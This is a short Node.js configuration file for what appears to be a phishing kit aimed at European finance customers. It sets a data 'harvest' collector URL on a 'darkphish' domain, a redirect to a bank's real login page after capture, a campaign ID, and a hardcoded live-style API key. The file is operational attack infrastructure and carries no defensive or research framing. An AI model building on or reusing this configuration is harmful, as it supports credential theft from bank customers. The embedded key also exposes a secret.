module.exports = {
  PORT: process.env.PORT || 8080,
  COLLECTOR_URL: process.env.COLLECTOR || 'https://collect.darkphish-svc.net/api/v2/harvest',
  REDIRECT_URL: 'https://legitimate-bank.com/login',
  CAMPAIGN_ID: 'camp_2026_eu_finance',
  // TODO: move to env vars before release
  API_KEY: 'dpk_live_8f3a2c1e9d7b4520',
};
